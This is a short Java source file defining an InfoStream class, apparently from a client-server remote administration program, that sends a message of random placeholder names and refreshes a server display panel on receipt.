package subterranean.crimson.universal.streams.infostream;

import subterranean.crimson.server.graphics.panels.mainscreen.MainPane;
import subterranean.crimson.server.network.Connection;
import subterranean.crimson.universal.BMN;
import subterranean.crimson.universal.Utilities;
import subterranean.crimson.universal.containers.Message;
import subterranean.crimson.universal.streams.Stream;

public class InfoStream extends Stream {

	public InfoStream(ISParameters param) {
		super(param);
	}

	public InfoStream(ISParameters param, Connection c) {
		super(param, c);
	}

	@Override
	public void received(Message m) {
		// update the profile
		// c.getProfile().info.cpuUsage = (String) m.auxObject[1];
		MainPane.dp.updateAll();
	}

	@Override
	public void send() {
		Message m = new Message(Utilities.randId(), BMN.STREAM_data);

		Object[] o = { getStreamID(), Utilities.nameGen(4), Utilities.nameGen(4) };
		m.auxObject = o;

		sendMessage(m);
	}

}